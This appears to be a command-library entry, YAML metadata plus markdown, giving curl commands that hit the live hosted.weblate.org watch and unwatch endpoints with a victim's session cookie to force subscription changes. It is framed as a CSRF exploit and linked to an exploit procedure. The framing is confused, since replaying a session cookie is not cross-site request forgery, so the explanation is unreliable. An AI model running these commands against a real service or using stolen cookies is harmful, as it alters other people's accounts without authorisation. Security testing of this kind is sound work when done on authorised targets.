---
id: cmd-curl-weblate-test-001
data: >-
  curl -X GET "https://hosted.weblate.org/accounts/watch/androbd/" -H "Cookie:
  sessionid=your_session_cookie" -v
tags:
  - web
  - test
  - csrf
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:23.331Z'
verified: false
validated: true
submitted: true
---
# curl-weblate-watch-test

## Command

```bash
curl -X GET "https://hosted.weblate.org/accounts/watch/androbd/" -H "Cookie: sessionid=your_session_cookie" -v
```

## Description

This command tests the CSRF-vulnerable watch endpoint in Weblate by sending a GET request with an authenticated session cookie, simulating an unauthorized subscription change.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL | Target endpoint (e.g., /accounts/watch/<project>/) | Yes |
| `-H "Cookie: sessionid=..."` | Includes the victim's session cookie for authentication | Yes |
| `-v` | Verbose output to show response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://hosted.weblate.org/accounts/watch/androbd/" -H "Cookie: sessionid=abc123"
```

### Advanced Usage

```bash
curl -X POST "https://hosted.weblate.org/accounts/unwatch/androbd/" -H "Cookie: sessionid=abc123" -d "" -v
```

## Expected Output

Successful response: HTTP/1.1 302 Found or 200 OK with redirect to project page, indicating the watch action completed without CSRF token.

## Related

- [[Related Procedure: Exploit-Weblate-CSRF-to-Force-Subscription-Changes]]
